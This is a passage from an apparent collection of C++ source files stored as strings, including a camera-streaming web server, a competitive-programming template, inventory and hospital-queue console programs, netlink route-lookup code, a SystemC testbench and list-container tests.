req->getMethod() << \" \" << req->getUrl() << endl;\n}\n\nvoid startServer(int port = 3000) {\n  /* Note that SSL is disabled unless you build with WITH_OPENSSL=1 */\n  globalApp = new uWS::App();\n  uWS::App &app = *globalApp;\n\n  cam.setFrameCallback(handleNewFrame);\n\n  app.get(\"/test\",\n          [](auto *res, auto *req) {\n            nlohmann::json user = {{\"name\", \"sam\"}};\n            nlohmann::json responseJson = {{\"message\", \"just some json from somet shit\"}, {\"something_else\", user}};\n            std::string response = responseJson.dump();\n\n            res->writeStatus(\"200 OK\")->writeHeader(\"Content-Type\", \"application/json\")->end(response);\n            logRequest(res, req);\n          })\n      .get(\"/image\",\n           [](auto *res, auto *req) {\n             //  myCam::setupCamera();\n             //  auto frame = myCam::getLatestFrame();\n             //  if (frame) {\n             //    res->writeStatus(\"200 OK\")\n             //        ->writeHeader(\"Content-Type\", \"image/jpeg\")\n             //        ->end(std::string_view((char *)frame->data(), frame->size()));\n             //  } else {\n             // No frame available\n             nlohmann::json responseJson = {{\"message\", \"no frame\"}};\n             std::string response = responseJson.dump();\n\n             res->writeStatus(\"200 OK\")->writeHeader(\"Content-Type\", \"application/json\")->end(response);\n             //  }\n             logRequest(res, req);\n           })\n      .post(\"/start\",\n            [](auto *res, auto *req) {\n              pool.enqueue([]() {\n                cam.start();\n                cam.go();\n              });\n              is_streaming = true;\n\n              nlohmann::json responseJson = {{\"message\", \"started\"}};\n              std::string response = responseJson.dump();\n\n              res->writeStatus(\"200 OK\")->writeHeader(\"Content-Type\", \"application/json\")->end(response);\n              logRequest(res, req);\n            })\n      .post(\"/stop\",\n            [](auto *res, auto *req) {\n              cam.finish();\n              nlohmann::json responseJson = {{\"message\", \"stopped\"}};\n              std::string response = responseJson.dump();\n\n              res->writeStatus(\"200 OK\")->writeHeader(\"Content-Type\", \"application/json\")->end(response);\n              logRequest(res, req);\n            })\n\n      .ws<string>(\n          \"/ws\",\n          {\n\n              .compression = uWS::SHARED_COMPRESSOR,\n              .maxPayloadLength = 16 * 1024 * 1024,\n              .idleTimeout = 10,\n              .open =\n                  [](auto *ws) {\n                    cout << \"Thread \" << this_thread::get_id() << \" connected\" << endl;\n                    ws->subscribe(\"image-stream\");\n                  },\n\n              .message = [](auto *ws, string_view message, uWS::OpCode opCode) { ws->subscribe(\"image-stream\"); },\n              .close =\n                  [](auto *ws, int code, string_view message) {\n                    cout << \"Thread \" << this_thread::get_id() << \" disconnected\" << endl;\n                  }\n\n          })\n      .listen(port,\n              [](auto *listen_socket) {\n                if (listen_socket) {\n                  /* Note that us_listen_socket_t is castable to us_socket_t */\n                  cout << \"Thread \" << this_thread::get_id() << \" listening on port \"\n                       << us_socket_local_port(true, (struct us_socket_t *)listen_socket) << endl;\n                } else {\n                  cout << \"Thread \" << this_thread::get_id() << \" failed to listen on port 3000\" << endl;\n                }\n              })\n      .run();\n\n  cam.finish();\n\n  cout << \"Thread \" << this_thread::get_id() << \" server ended\" << endl;\n}",
    "#include <bits/stdc++.h>\nusing namespace std;\n#include <ext/pb_ds/assoc_container.hpp>\n#include <ext/pb_ds/tree_policy.hpp>\nusing namespace __gnu_pbds;\n#define pbds tree<ll, null_type, less<ll>, rb_tree_tag, tree_order_statistics_node_update>\n//order_of_key (K): Number of items strictly smaller than K.\n//find_by_order(k): Kth element in a Set (counting from zero).order_of_key\n#define int long long\n#define pb(a) push_back(a)\n#define ppb() pop_back()\n#define all(v) v.begin(),v.end()\n#define pii pair<int,int>\n#define vi vector<int>\n#define minheap(x) priority_queue<x,vector<x>, greater<x>>\n#define maxheap(x) priority_queue<x>\n#define vvi vector<vector<int>>\n#define vvc vector<vector<char>>\n#define vs vector<string>\n#define vc vector<char>\n#define vvc vector<vector<char>>\n#define vvpi vector<vector<pii>>\n#define vpi vector<pii>\n#define umi unordered_map<int,int>\n#define mii map<int,int>\n#define mci map<char,int>\n#define mpii map<pii,int>\n#define si set<int>\n#define sc set<char>\ntypedef long long ll;\ntypedef unsigned long long ull;\ntypedef long double lld;\n#define mod 1000000007\n#define endl  \"\\n\"\nvoid ina(vi& arr){for (int i = 0; i < arr.size(); ++i) {cin>>arr[i];}}\n#define set_bits  __builtin_popcountll\n#define low(s) transform(s.begin(), s.end(), s.begin(), ::tolower);\n#define upp(s) transform(s.begin(), s.end(), s.begin(), ::toupper);\n#define nline cout<<\"\\n\";\n#define yes cout<<\"YES\\n\";\n#define double           long double\n#define no cout<<\"NO\\n\";\n#define fr(a,b,c)        for(int a=b;a<c;a++)\n#define gxy map<pii,bool>\n#define gx map<int,bool>\n#define hsb               __lg\n//hsb returns highest set bit of x\n\nvoid boost(){ios_base::sync_with_stdio(false);cin.tie(NULL);cout.tie(NULL);}\nint ithbit(int n, int i){int mask = 1<<i;int ans = n&mask;if(ans == 0){return 0;}else{return 1;}}\nvoid setithbit(int & n, int i, int target){int mask = ~(1<<i);n = n & mask;int mask1 = target<<i;n = n | mask1;}\nbool pow2(int n){if((n&(n-1)) == 0){return true;}return false;}\nvoid clearbit(int n, int i, int j){int a = (-1<<(i+1));int b = (1<<j) - 1;int mask = a | b;n = n & mask;}\n// functions\nll gcd(ll a, ll b) {if (b > a) {return gcd(b, a);} if (b == 0) {return a;} return gcd(b, a % b);}\nll expo(ll a, ll b) {ll res = 1; while (b > 0) {if (b & 1)res = (res * a) % mod; a = (a * a) % mod; b = b >> 1;} return res;}\nvector <int> primes(int n,int m){bool prime[n+1];vector <int> ans;memset(prime, true, sizeof(prime));for (int p=2; p*p<=n; p++){if (prime[p] == true){for (int i=p*2; i<=n; i += p)prime[i] = false;}}for (int p=m; p<=n; p++) { if (prime[p]) { ans.push_back(p); } }return ans;}\nint bintodec(string &s){return stoi(s,nullptr,2);}\nint binaryindex(vector <int> &arr, int target) {int start = 0,size = arr.size();int end = size - 1;int mid = start + (end - start ) / 2;while(start <= end) {int element = arr[mid];if(element == target) {return mid;}if(target < element) {end = mid - 1;}else {start = mid + 1;}mid = start + (end - start ) / 2;}return -1;}\nbool valid(char &ch) {if( (ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z') || (ch >= '0' && ch <= '9')) {return 1;}return 0;}\nbool isvowel(char a){bool p = false;if(a=='A' || a=='E' || a=='I' || a=='O' || a=='U' || a=='a' || a=='e' || a=='i' || a=='o' || a=='u'){p = true;}return p;}\nint factorial(unsigned int n){if(n == 0)return 1;int i = n, fact = 1;while (n / i != n) {fact = fact * i;i--;}return fact;}\nvector<long long> factorization(long long n) {vector<long long> factorization;for (long long d = 2; d * d <= n; d++) {while (n % d == 0) {factorization.push_back(d);n /= d;}}if (n > 1)factorization.push_back(n);return factorization;}\nbool perfectsquare(int num) {if(num==0){ return false; }int l=1;int h=num;while(l<=h){int m=l+(h-l)/2;if(m==num/m&&num%m==0) return true;else if(m>num/m){h=m-1;}else{l=m+1;}}return false;}\nint closestperfectsq(int N){int x = sqrt(N);if((x*x)==N){return N;}int aboveN = (x+1)*(x+1);return aboveN;}\nstring dectobin(int number){int n = (int)(log2(number));return bitset<64>(number).to_string().substr(64 - n- 1);}\nint greycode (int n) {return n ^ (n >> 1);}\nbool odd(int &n){return n&1;}\nbool even(int &n){return !(n&1);}\nbool isPrime(int n){if (n <= 1) { return false; } for (int i = 2; i <= sqrt(n); i++)if (n % i == 0){return false;}return true;}\nint min(int a,int b){if(a<b){return a;}return b;}\nvector<int> zindex(string s) {int n = s.size();vector<int> z(n);int l = 0, r = 0;for(int i = 1; i < n; i++) {if(i < r) {z[i] = min(r - i, z[i - l]);}while(i + z[i] < n && s[z[i]] == s[i + z[i]]) {z[i]++;}if(i + z[i] > r) {l = i;r = i + z[i];}}return z;}\nint mex(vi& arr){\n    set<int> st;\n    st.insert(all(arr));\n    int i = 0;\n    for (const auto &item: st){\n        if(item != i){\n            return i;\n        }\n        i++;\n    }\n    return i;\n}\nll binpowmod(ll a,ll b) {\n    ll ans = 1;\n    while(b > 0) {\n        if((b & 1) == 1) {\n            ans *= a;\n            ans %= mod;\n        }\n        a *= a;\n        a %= mod;\n        b = b >> 1;\n    }\n    return ans;\n}\n\nll add",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\nstruct Barang {\r\n    int id;\r\n    string nama;\r\n    int jumlah;\r\n    double harga;\r\n};\r\n\r\nclass Gudang {\r\nprivate:\r\n    vector<Barang> barangList;\r\n\r\npublic:\r\n    // Menambahkan data barang\r\n    void tambahBarang(const Barang& barang) {\r\n        barangList.push_back(barang);\r\n        cout << \"Barang berhasil ditambahkan.\\n\";\r\n    }\r\n\r\n    // Menghapus data barang\r\n    void hapusBarang(int id) {\r\n        auto it = remove_if(barangList.begin(), barangList.end(), [id](const Barang& b) {\r\n            return b.id == id;\r\n        });\r\n        if (it != barangList.end()) {\r\n            barangList.erase(it, barangList.end());\r\n            cout << \"Barang berhasil dihapus.\\n\";\r\n        } else {\r\n            cout << \"Barang dengan ID \" << id << \" tidak ditemukan.\\n\";\r\n        }\r\n    }\r\n\r\n    // Mencari barang berdasarkan ID\r\n    void cariBarang(int id) {\r\n        auto it = find_if(barangList.begin(), barangList.end(), [id](const Barang& b) {\r\n            return b.id == id;\r\n        });\r\n        if (it != barangList.end()) {\r\n            tampilkanBarang(*it);\r\n        } else {\r\n            cout << \"Barang dengan ID \" << id << \" tidak ditemukan.\\n\";\r\n        }\r\n    }\r\n\r\n    // Mengedit atau memperbarui data barang\r\n    void editBarang(int id, const Barang& barangBaru) {\r\n        auto it = find_if(barangList.begin(), barangList.end(), [id](const Barang& b) {\r\n            return b.id == id;\r\n        });\r\n        if (it != barangList.end()) {\r\n            *it = barangBaru;\r\n            cout << \"Barang berhasil diperbarui.\\n\";\r\n        } else {\r\n            cout << \"Barang dengan ID \" << id << \" tidak ditemukan.\\n\";\r\n        }\r\n    }\r\n\r\n    // Menampilkan data barang\r\n    void tampilkanBarang(const Barang& barang) {\r\n        cout << \"ID: \" << barang.id << \"\\n\"\r\n             << \"Nama: \" << barang.nama << \"\\n\"\r\n             << \"Jumlah: \" << barang.jumlah << \"\\n\"\r\n             << \"Harga: \" << barang.harga << \"\\n\";\r\n    }\r\n\r\n    // Menampilkan semua data barang\r\n    void tampilkanSemuaBarang() {\r\n        for (const auto& barang : barangList) {\r\n            tampilkanBarang(barang);\r\n            cout << \"---------------------\\n\";\r\n        }\r\n    }\r\n};\r\n\r\nvoid tampilkanMenu() {\r\n    cout << \"===== Menu Gudang =====\\n\";\r\n    cout << \"1. Tambah Barang\\n\";\r\n    cout << \"2. Hapus Barang\\n\";\r\n    cout << \"3. Cari Barang\\n\";\r\n    cout << \"4. Edit Barang\\n\";\r\n    cout << \"5. Tampilkan Semua Barang\\n\";\r\n    cout << \"6. Keluar\\n\";\r\n    cout << \"=======================\\n\";\r\n    cout << \"Pilih menu: \";\r\n}\r\n\r\nint main() {\r\n    Gudang gudang;\r\n    int pilihan;\r\n\r\n    do {\r\n        tampilkanMenu();\r\n        cin >> pilihan;\r\n\r\n        switch (pilihan) {\r\n        case 1: {\r\n            Barang barang;\r\n            cout << \"Masukkan ID Barang: \";\r\n            cin >> barang.id;\r\n            cout << \"Masukkan Nama Barang: \";\r\n            cin.ignore();\r\n            getline(cin, barang.nama);\r\n            cout << \"Masukkan Jumlah Barang: \";\r\n            cin >> barang.jumlah;\r\n            cout << \"Masukkan Harga Barang: \";\r\n            cin >> barang.harga;\r\n            gudang.tambahBarang(barang);\r\n            break;\r\n        }\r\n        case 2: {\r\n            int id;\r\n            cout << \"Masukkan ID Barang yang akan dihapus: \";\r\n            cin >> id;\r\n            gudang.hapusBarang(id);\r\n            break;\r\n        }\r\n        case 3: {\r\n            int id;\r\n            cout << \"Masukkan ID Barang yang akan dicari: \";\r\n            cin >> id;\r\n            gudang.cariBarang(id);\r\n            break;\r\n        }\r\n        case 4: {\r\n            int id;\r\n            Barang barang;\r\n            cout << \"Masukkan ID Barang yang akan diedit: \";\r\n            cin >> id;\r\n            cout << \"Masukkan Nama Barang baru: \";\r\n            cin.ignore();\r\n            getline(cin, barang.nama);\r\n            cout << \"Masukkan Jumlah Barang baru: \";\r\n            cin >> barang.jumlah;\r\n            cout << \"Masukkan Harga Barang baru: \";\r\n            cin >> barang.harga;\r\n            barang.id = id;\r\n            gudang.editBarang(id, barang);\r\n            break;\r\n        }\r\n        case 5:\r\n            cout << \"\\nDaftar semua barang di gudang:\\n\";\r\n            gudang.tampilkanSemuaBarang();\r\n            break;\r\n        case 6:\r\n            cout << \"Keluar dari program.\\n\";\r\n            break;\r\n        default:\r\n            cout << \"Pilihan tidak valid. Silakan coba lagi.\\n\";\r\n        }\r\n    } while (pilihan != 6);\r\n\r\n    return 0;\r\n}\r\n",
    "/*****************************************************************************\n\n  Licensed to Accellera Systems Initiative Inc. (Accellera) under one or\n  more contributor license agreements.  See the NOTICE file distributed\n  with this work for additional information regarding copyright ownership.\n  Accellera licenses this file to you under the Apache License, Version 2.0\n  (the \"License\"); you may not use this file except in compliance with the\n  License.  You may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\n  Unless required by applicable law or agreed to in writing, software\n  distributed under the License is distributed on an \"AS IS\" BASIS,\n  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n  implied.  See the License for the specific language governing\n  permissions and limitations under the License.\n\n *****************************************************************************/\n\n/*****************************************************************************\n\n  tb.cpp -- \n\n  Original Author: Martin Janssen, Synopsys, Inc., 2002-02-15\n\n *****************************************************************************/\n\n/*****************************************************************************\n\n  MODIFICATION LOG - modifiers, enter your name, affiliation, date and\n  changes you are making here.\n\n      Name, Affiliation, Date:\n  Description of Modification:\n\n *****************************************************************************/\n\n#include \"systemc.h\"\n#include \"tb.h\"\n#include \"define.h\"\n \nvoid tb::entry() \n{\n  cout << \"Begin Simulation\" << endl;\n\n\n  cout << \"End Simulation\" << endl;\n\n  sc_stop();\n\n}\n\n",
    "#include \"net_info.h\"\n\n#include <linux/ethtool.h>\n#include <linux/genetlink.h>\n#include <linux/netlink.h>\n#include <linux/rtnetlink.h>\n#include <linux/sockios.h>\n#include <net/if.h>\n#include <spdlog/spdlog.h>\n#include <sys/ioctl.h>\n\n#include <cstring>\n#include <glaze/glaze.hpp>\n#include <optional>\n#include <string>\n\n#include \"expected.h\"\n#include \"expected_helpers.h\"\n#include \"fixed_name.hpp\"\n#include \"spdlog/fmt/bundled/core.h\"\n\n#define BUFFER_SIZE 8192\n\n#if defined(__clang__)\n#pragma clang diagnostic push\n#pragma clang diagnostic ignored \"-Wsign-compare\"\n#endif\n\ntl::expected<EtherAddr, std::string> net_info::get_mac_address(FixedName<IFNAMSIZ> iface,\n    const InAddr &ip) {\n\tint sock = socket(AF_INET, SOCK_DGRAM, 0);\n\tif (sock < 0) {\n\t\treturn tl::unexpected(\"Cannot open socket\");\n\t}\n\n\tstruct arpreq req;\n\tmemset(&req, 0, sizeof(req));\n\n\tstruct sockaddr_in *sin = (struct sockaddr_in *) &req.arp_pa;\n\tsin->sin_family = AF_INET;\n\tsin->sin_addr = ip;\n\n\tmemcpy(req.arp_dev, iface.buf.data(), IFNAMSIZ);\n\n\tif (ioctl(sock, SIOCGARP, &req) < 0) {\n\t\tclose(sock);\n\t\treturn tl::unexpected(\"ioctl error\");\n\t}\n\n\tEtherAddr addr;\n\tmemcpy((void *) &addr, (void *) req.arp_ha.sa_data, RTE_ETHER_ADDR_LEN);\n\n\tclose(sock);\n\n\treturn addr;\n}\n\ntl::expected<FixedName<IFNAMSIZ>, std::string> get_if_to_use(\n    std::optional<FixedName<IFNAMSIZ>> user_if,\n    std::optional<FixedName<IFNAMSIZ>> default_interface) {\n\tif (user_if.has_value())\n\t\treturn user_if.value();\n\n\tif (default_interface.has_value())\n\t\treturn default_interface.value();\n\n\treturn tl::unexpected(\n\t    \"Cannot find default interface and user did not provide interface name\");\n}\n\ntl::expected<net_info::RouteInfo, std::string> net_info::get_route_info(\n    std::optional<FixedName<IFNAMSIZ>> if_name) {\n\tint received_bytes = 0, msg_len = 0, route_attribute_len = 0;\n\tint sock = -1;\n\tuint32_t msgseq = 0;\n\tstruct nlmsghdr *nlh, *nlmsg;\n\tstruct rtmsg *route_entry;\n\t// This struct contain route attributes (route type)\n\tstruct rtattr *route_attribute;\n\tchar msgbuf[BUFFER_SIZE], buffer[BUFFER_SIZE];\n\tchar *ptr = buffer;\n\tstruct timeval tv;\n\tstd::optional<FixedName<IFNAMSIZ>> default_interface;\n\tstd::map<FixedName<IFNAMSIZ>, RouteInfo> routes_map;\n\n\tif ((sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE)) < 0) {\n\t\treturn tl::unexpected(\"cannot open socket\");\n\t}\n\n\tmemset(msgbuf, 0, sizeof(msgbuf));\n\tmemset(buffer, 0, sizeof(buffer));\n\n\t/* point the header and the msg structure pointers into the buffer */\n\tnlmsg = (struct nlmsghdr *) msgbuf;\n\n\t/* Fill in the nlmsg header*/\n\tnlmsg->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg));\n\tnlmsg->nlmsg_type = RTM_GETROUTE; // Get the routes from kernel routing table .\n\tnlmsg->nlmsg_flags = NLM_F_DUMP | NLM_F_REQUEST; // The message is a request for dump.\n\tnlmsg->nlmsg_seq = msgseq++;                     // Sequence of the message packet.\n\tnlmsg->nlmsg_pid = getpid();                     // PID of process sending the request.\n\n\t/* 1 Sec Timeout to avoid stall */\n\ttv.tv_sec = 1;\n\tsetsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (struct timeval *) &tv, sizeof(struct timeval));\n\t/* send msg */\n\tif (send(sock, nlmsg, nlmsg->nlmsg_len, 0) < 0) {\n\t\tclose(sock);\n\t\treturn tl::unexpected(\"send failed\");\n\t}\n\n\t/* receive response */\n\tdo {\n\t\treceived_bytes = recv(sock, ptr, sizeof(buffer) - msg_len, 0);\n\t\tif (received_bytes < 0) {\n\t\t\tclose(sock);\n\t\t\treturn tl::unexpected(\"recv failed\");\n\t\t}\n\n\t\tnlh = (struct nlmsghdr *) ptr;\n\n\t\t/* Check if the header is valid */\n\t\tif ((NLMSG_OK(nlmsg, received_bytes) == 0) || (nlmsg->nlmsg_type == NLMSG_ERROR)) {\n\t\t\tclose(sock);\n\t\t\treturn tl::unexpected(\"error in received packet\");\n\t\t}\n\n\t\t/* If we received all data break */\n\t\tif (nlh->nlmsg_type == NLMSG_DONE)\n\t\t\tbreak;\n\t\telse {\n\t\t\tptr += received_bytes;\n\t\t\tmsg_len += received_bytes;\n\t\t}\n\n\t\t/* Break if its not a multi part message */\n\t\tif ((nlmsg->nlmsg_flags & NLM_F_MULTI) == 0)\n\t\t\tbreak;\n\t} while (\n\t    (nlmsg->nlmsg_seq != msgseq) || (nlmsg->nlmsg_pid != static_cast<uint32_t>(getpid())));\n\n\t/* parse response */\n\tfor (; NLMSG_OK(nlh, received_bytes); nlh = NLMSG_NEXT(nlh, received_bytes)) {\n\t\tRouteInfo route_info{};\n\t\tInAddr dst_addr{};\n\n\t\t/* Get the route data */\n\t\troute_entry = (struct rtmsg *) NLMSG_DATA(nlh);\n\n\t\t/* We are just interested in main routing table */\n\t\tif (route_entry->rtm_table != RT_TABLE_MAIN)\n\t\t\tcontinue;\n\n\t\troute_attribute = (struct rtattr *) RTM_RTA(route_entry);\n\t\troute_attribute_len = RTM_PAYLOAD(nlh);\n\n\t\t// spdlog::info(\"iter\");\n\n\t\t/* Loop through all attributes */\n\t\tfor (; RTA_OK(route_attribute, route_attribute_len);\n\t\t     route_attribute = RTA_NEXT(route_attribute, route_attribute_len)) {\n\t\t\tInAddr addr_buf{};\n\t\t\tswitch (route_attribute->rta_type) {\n\t\t\t\tcase RTA_OIF:\n\t\t\t\t\tif_indextoname(*(int *) RTA_DATA(route_attribute),\n\t\t\t\t\t    route_info.if_name.buf.data());\n\t\t\t\t\troute_info.if_name.len = std::char_traits<char>::length(\n\t\t\t\t\t    route_info.if_name.buf.data());\n\t\t\t\t\t// spdlog::info(route_info.if_name.c_str());\n\t\t\t\t\tbreak;\n\t\t\t\tcase RTA_GATEWAY:\n\t\t\t\t\tmemcpy",
    "#include<iostream>\r\n#include<conio.h>\r\n#include<string.h>\r\n#include<stdlib.h>\r\nusing namespace std;\r\n\r\nstruct patient\r\n{\r\n    long long ID;\r\n\tstring firstname;\r\n\tstring lastname;\r\n\tint age;\r\n\tchar blood[5];\r\n\tchar gender;\r\n    patient*next;\r\n};\r\nclass linkedqueue\r\n{\r\n\tpatient *head,*last;\r\n\tpublic:\r\n\tlinkedqueue() //constructor\r\n\t{\r\n\t\thead=NULL;\r\n\t\tlast=NULL;\r\n\t}\r\n    patient input();\r\n    void insertatend();\r\n    void insertatbeg();\r\n    void getpatientout();\r\n    void listofpatients();\r\n    int search(int);\r\n    char departmentname[50];\r\n};\r\n\r\nint linkedqueue :: search(int item)\r\n{\r\n\t if(head==NULL)\r\n     return false;\r\n     else\r\n     {\r\n     int flag=0;\r\n     patient*p=new patient();\r\n     p=head;\r\n\r\n     while( p->next!=NULL && p->ID!=item )\r\n     {\r\n        p=p->next;\r\n     }\r\n     if(p->ID==item)\r\n     {\r\n\t \tflag=1;\r\n\t \treturn true;\r\n     }\r\n     if(flag==0)\r\n     return false;\r\n     }\r\n}\r\n\r\nint readnumber()\r\n{\r\n   char b[20];\r\n   cin.getline(b, sizeof(b));\r\n   return atoi(b);\r\n}\r\n\r\npatient linkedqueue :: input()\r\n{\r\n    int flag=0;\r\n   patient *p=new patient();\r\n   cout << \"\\n   Please enter data for patient\\n\";\r\n   cout<<\"\\n   First name     : \";\r\n   getline(cin,p->firstname);\r\n   cout << \"   Last name      : \";\r\n   getline(cin,p->lastname);\r\n   again :\r\n   cout << \"   Blood Group    : \";\r\n   cin>>p->blood;\r\n   if((strcmp(p->blood,\"A+\")==0)||(strcmp(p->blood,\"a+\")==0)||(strcmp(p->blood,\"A-\")==0)||(strcmp(p->blood,\"a-\")==0)||\r\n      (strcmp(p->blood,\"B+\")==0)||(strcmp(p->blood,\"b+\")==0)||(strcmp(p->blood,\"B-\")==0)||(strcmp(p->blood,\"b-\")==0)||\r\n      (strcmp(p->blood,\"O+\")==0)||(strcmp(p->blood,\"o+\")==0)||(strcmp(p->blood,\"O-\")==0)||(strcmp(p->blood,\"o-\")==0)||\r\n      (strcmp(p->blood,\"AB+\")==0)||(strcmp(p->blood,\"ab+\")==0)||(strcmp(p->blood,\"AB-\")==0)||(strcmp(p->blood,\"ab-\")==0))\r\n             flag=1;\r\n    if(flag==0)\r\n    {\r\n        cout<<\"\\n   Invalid Blood Group Try Again..\\n\\n\";\r\n        goto again;\r\n\r\n    }\r\n   cout<<\"   Gender(m/f)    : \";\r\n   cin>>p->gender;\r\n   cout<<\"   Age            : \";\r\n   cin>>p->age;\r\n   cout<<\"   Mobile number  : \";\r\n   cin>>p->ID;\r\n\r\n\r\n\tif(search(p->ID))\r\n\t{\r\n\t\tp->ID=0;\r\n\t\tcout << \"\\n   Data not valid. Operation cancelled.\";\r\n\t}\r\n\treturn *p;\r\n}\r\n\r\nvoid output(patient *p)\r\n{\r\n\tcout<<\"\\n  \\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\";\r\n\tcout<<\"\\n   Patient data:\\n\";\r\n\tcout<<\"\\n   First Name         : \"<<p->firstname;\r\n\tcout<<\"\\n   Last Name          : \"<<p->lastname;\r\n\tcout<<\"\\n   Gender             : \"<<p->gender;\r\n\tcout<<\"\\n   Age                : \"<<p->age;\r\n\tcout<<\"\\n   Blood Group        : \"<<p->blood;\r\n\tcout<<\"\\n   Mobile Number      : \"<<p->ID;\r\n\tcout<<\"\\n\\n  \\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\";\r\n}\r\nvoid linkedqueue :: insertatbeg()\r\n{\r\n     patient*p=new patient();\r\n     *p=input();\r\n     if(p->ID==0)\r\n     return;\r\n\r\n     if(head==NULL)\r\n\r\n     {\r\n         head=p;\r\n         last=p;\r\n         p->next=NULL;\r\n     }\r\n     else\r\n     {\r\n        p->next=head;\r\n        head=p;\r\n     }\r\n     system(\"cls\");\r\n     cout << \"\\n\\tPatient added:\";\r\n     output(p);\r\n}\r\nvoid linkedqueue:: insertatend()\r\n{\r\n     patient*p=new patient();\r\n     *p=input();\r\n     if(p->ID==0)\r\n     return;\r\n\r\n     if(head==NULL)\r\n     {\r\n     \thead=p;\r\n        last=p;\r\n        p->next=NULL;\r\n     }\r\n     else\r\n     {\r\n     \tp->next=NULL;\r\n        last->next=p;\r\n        last=p;\r\n     }\r\n     system(\"cls\");\r\n     cout<<\"\\n  \\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\";\r\n     cout<<\"\\n  |-- HOSPITAL MANAGEMENT SYSTEM --|\";\r\n     cout<<\"\\n  \\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\n\";\r\n     cout <<\"\\n  ----------PATIENT ADDED-----------\";\r\n     output(p);\r\n}\r\nvoid linkedqueue :: getpatientout()\r\n{\r\n\t system(\"cls\");\r\n     if(head==NULL)\r\n     {\r\n     \tcout<<\"\\n  No Patient to operate\";\r\n     }\r\n     else\r\n     {\r\n     \tpatient*p=new patient();\r\n     \tp=head;\r\n     \thead=head->next;\r\n \t    cout << \"\\n  Patient to operate:\";\r\n        output(p);\r\n \t }\r\n}\r\n\r\nvoid linkedqueue :: listofpatients()\r\n{\r\n     if(head==NULL)\r\n     {\r\n     \tcout<<\"\\n  No patient\";\r\n \t }\r\n \t      system(\"cls\");\r\n     cout<<\"\\n  \\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\";\r\n     cout<<\"\\n  |-- HOSPITAL MANAGEMENT SYSTEM --|\";\r\n     cout<<\"\\n  \\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\xcd\\n\";\r\n     patient*p=new patient;\r\n     p=head;\r\n     while(p!=NULL)\r\n     {\r\n        cout<<\"\\n   Patient data:\\n\";\r\n\t\tcout<<\"\\n   First Name       : \"<<p->firstname;\r\n\t\tcout<<\"\\n   Last ",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   list.test.cpp                                      :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: caakkaya <caakkaya@student.42.fr>          +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/08/03 16:54:59 by caakkaya          #+#    #+#             */\n/*   Updated: 2024/08/03 16:55:00 by caakkaya         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"../../test-utils/testUtils.hpp\"\n\ntemplate <typename T>\nstatic void test_range_constructor()\n{\n    std::list<T> list(20, T());\n    std::list<T> list_2(list.begin(), list.end());\n    ft::list<T> ft_list_2(list.begin(), list.end());\n    std::list<T> list_3;\n\n    assert(list_2.size() == 20);\n    for (typename std::list<T>::iterator it = list_2.begin(); it != list_2.end(); it++)\n    {\n        assert(*it == T());\n    }\n\n    assert(ft_list_2.size() == 20);\n    for (typename ft::list<T>::iterator it = ft_list_2.begin(); it != ft_list_2.end(); it++)\n    {\n        assert(*it == T());\n    }\n}\n\nstatic void range_constructor()\n{\n    test_range_constructor<int>();\n    test_range_constructor<float>();\n    test_range_constructor<char>();\n    test_range_constructor<char *>();\n    test_range_constructor<std::string>();\n\n    display_success(\"range constructor\");\n}\n\ntemplate <typename T>\nstatic void test_fill_constructor_no_value()\n{\n    std::list<T> list(size_t(20));\n    ft::list<T> ft_list(size_t(20));\n\n    assert(list.size() == 20);\n    assert(ft_list.size() == 20);\n    for (typename std::list<T>::iterator it = list.begin(); it != list.end(); it++)\n    {\n        assert(*it == T());\n    }\n\n    for (typename ft::list<T>::iterator it = ft_list.begin(); it != ft_list.end(); it++)\n    {\n        assert(*it == T());\n    }\n}\n\ntemplate <typename T>\nstatic void test_fill_constructor_with_value()\n{\n    std::list<T> list(size_t(20), T());\n    ft::list<T> ft_list(size_t(20), T());\n\n    assert(list.size() == 20);\n    assert(ft_list.size() == 20);\n    for (typename 